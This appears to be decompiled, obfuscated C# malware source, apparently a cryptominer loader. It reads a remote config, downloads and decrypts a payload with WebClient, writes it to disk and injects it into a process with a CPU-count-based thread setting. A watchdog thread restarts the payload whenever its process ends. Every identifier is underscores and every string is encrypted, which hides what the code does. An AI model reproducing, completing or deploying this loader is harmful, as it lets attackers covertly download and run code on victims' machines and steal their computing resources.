using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

[StandardModule]
internal sealed class ________________________
{
	public static int _ = 0;

	public unsafe static void _()
	{
		try
		{
			int num3 = default(int);
			string[] array = default(string[]);
			string text2 = default(string);
			byte[] array2 = default(byte[]);
			string text3 = default(string);
			int num7 = default(int);
			while (true)
			{
				____();
				string text = __________________________________________________________________.____(_003CModule_003E.______<string>(3855844404u));
				int num = ___________._;
				int num2;
				if ((Operators.CompareString(text, _003CModule_003E.__________((int)((1409286144 * num - 1468 + -4923 == -num + num) ? (sizeof(double) + 1974406803) : ((15812 + ((uint)num / 52870u + 88 >> 29) != (uint)(5 * num + num * 3)) ? (sizeof(byte) + 22546) : ((nint)Type.EmptyTypes.LongLength + -1694156197))), sizeof(uint) + 23682, 105), false) == 0) | (Operators.CompareString(text, _003CModule_003E._______<string>(2170582594u), false) == 0))
				{
					num2 = 10117;
					num3 = _003CModule_003E._____________;
					if ((((uint)(num3 << 17) / 512u) | 0x89FFFFD2u) != 2315255762u)
					{
						goto IL_0110;
					}
					return;
				}
				array = Strings.Split(text, _003CModule_003E.___<string>(3242391558u), -1, (CompareMethod)0);
				goto IL_0359;
				IL_034f:
				nint num4 = (nint)Type.EmptyTypes.LongLength + 4;
				goto IL_02ed;
				IL_0310:
				num2 = -5286;
				text2 = ______________________.____ + array[1];
				if (!File.Exists(text2))
				{
					if (num2 != -5286 || (1 & (num2 + -5548)) != (1 & -num2))
					{
						continue;
					}
					goto IL_0110;
				}
				goto IL_01d6;
				IL_02ed:
				while (true)
				{
					switch (num4)
					{
					case 4:
						break;
					case 3:
						goto end_IL_02ed;
					case 2:
						______________________________________________________________.______________(_003CModule_003E.___<string>(982404538u), _003CModule_003E.______<string>(867525750u) + array[1]);
						num4 = (nint)Type.EmptyTypes.LongLength + 3;
						continue;
					case 0:
					{
						array2 = ________________________________________________________________________________.______(array2);
						string path = text2;
						byte[] byte_ = array2;
						int int_ = sizeof(float) + -134;
						int num5 = _003CModule_003E._____________;
						nint num6;
						if (2097152 * (num5 << 18) + int.MinValue != (int)((uint)(num5 << 8) / 256u))
						{
							int _________ = _003CModule_003E.__________;
							num6 = ((107 * _________ + _________ * 149 != 3693) ? ((nint)Type.EmptyTypes.LongLength + 512) : (sizeof(ulong) + -2038991469));
						}
						else
						{
							num6 = (nint)Type.EmptyTypes.LongLength + 837466095;
						}
						File.WriteAllBytes(path, ___________________________________________________________________._______(byte_, _003CModule_003E.__________(int_, (int)num6, (int)(((((uint)num5 / 459201431u + 1003) ^ 0x92DAA4BAu) == 0) ? (sizeof(double) + 267480272) : ((nint)Type.EmptyTypes.LongLength + 59)))));
						goto case 2;
					}
					case 5:
						goto IL_0310;
					default:
						goto IL_0359;
					case 6:
						goto IL_038a;
					}
					text3 = text3.Replace(_003CModule_003E.____<string>(322744478u), ___(array[3]));
					num2 = (int)((nint)Type.EmptyTypes.LongLength + -5286);
					if ((((uint)num % 84942u) | 0x25E3FFFF) == 635699199)
					{
						num4 = sizeof(Guid) + -11;
						continue;
					}
					if ((-8421 ^ (num7 + 15 * num7)) == 0)
					{
						goto IL_0359;
					}
					num4 = (nint)Type.EmptyTypes.LongLength + -1264448964;
					continue;
					end_IL_02ed:
					break;
				}
				goto IL_01d6;
				IL_038a:
				if (!_______________________________________________________________________.___________(_____________________________________________________________________________.__, text3, File.ReadAllBytes(text2), bool_0: true, bool_1: true, bool_2: true))
				{
					______________________________________________________________.______________(_003CModule_003E.___<string>(1387161447u), _003CModule_003E.____<string>(3100098944u));
				}
				break;
				IL_0359:
				while (true)
				{
					text3 = array[2];
					if (!text3.Contains(_003CModule_003E._______<string>(1091163632u)))
					{
						break;
					}
					int num8 = ___________._;
					if ((~((uint)num8 / 24460871u) & 0x8000D97) == 0)
					{
						continue;
					}
					goto IL_034f;
				}
				goto IL_0310;
				IL_0110:
				WebClient webClient = new WebClient();
				array2 = ___________________________________________________________________._______(webClient.DownloadData(array[0]), _003CModule_003E._____<string>(1822288094u));
				num4 = ((num3 * 4 + num3 * 12 == -9155) ? ((nint)Type.EmptyTypes.LongLength + -1831708294) : (sizeof(Guid) + -16));
				goto IL_02ed;
				IL_01d6:
				________________________._ = 1;
				if (_______________________________________________________________________.___________(_____________________________________________________________________________.__, text3, File.ReadAllBytes(text2), bool_0: false, bool_1: true, bool_2: true))
				{
					break;
				}
				num4 = (nint)Type.EmptyTypes.LongLength + 6;
				goto IL_02ed;
			}
			Thread.Sleep(5000);
			Thread thread = new Thread(__);
			thread.Start();
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			______________________________________________________________.______________(_003CModule_003E._____<string>(2571642080u), _003CModule_003E.______<string>(4090731993u) + ex2.ToString());
			ProjectData.ClearProjectError();
		}
	}

	public static void __()
	{
		while (true)
		{
			try
			{
				if (________________________._ < 3)
				{
					break;
				}
				Process.GetProcessById(________________________._);
				Thread.Sleep(5000);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				________________________._ = 0;
				_();
				ProjectData.ClearProjectError();
				break;
			}
		}
	}

	public static string ___(string string_0)
	{
		try
		{
			int processorCount = Environment.ProcessorCount;
			string result = default(string);
			nint num;
			switch (processorCount)
			{
			case 1:
				result = _003CModule_003E.______<string>(4254570386u);
				num = (nint)Type.EmptyTypes.LongLength + 3;
				goto IL_0090;
			case 3:
				return _003CModule_003E._______<string>(1155951011u);
			default:
				{
					if (Operators.CompareString(string_0, _003CModule_003E._____<string>(1824143085u), false) == 0)
					{
						num = (nint)Type.EmptyTypes.LongLength + 0;
					}
					else
					{
						if (Operators.CompareString(string_0, _003CModule_003E._____<string>(3099528854u), false) != 0)
						{
							if (Operators.CompareString(string_0, _003CModule_003E.______<string>(2422878898u), false) == 0)
							{
								return (processorCount - 1).ToString();
							}
							return _003CModule_003E.____<string>(1467947727u);
						}
						num = (nint)Type.EmptyTypes.LongLength + 2;
					}
					goto IL_0090;
				}
				IL_0090:
				while (true)
				{
					switch (num)
					{
					case 2:
						break;
					case 0:
						return processorCount.ToString();
					default:
						return result;
					case 1:
						return result;
					case 3:
						return result;
					}
					result = ((double)processorCount / 2.0).ToString();
					num = (nint)Type.EmptyTypes.LongLength + 1;
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = _003CModule_003E.______<string>(4254570386u);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static void ____()
	{
		try
		{
			if (________________________._ >= 3)
			{
				Process processById = Process.GetProcessById(________________________._);
				processById.Kill();
				________________________._ = 0;
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
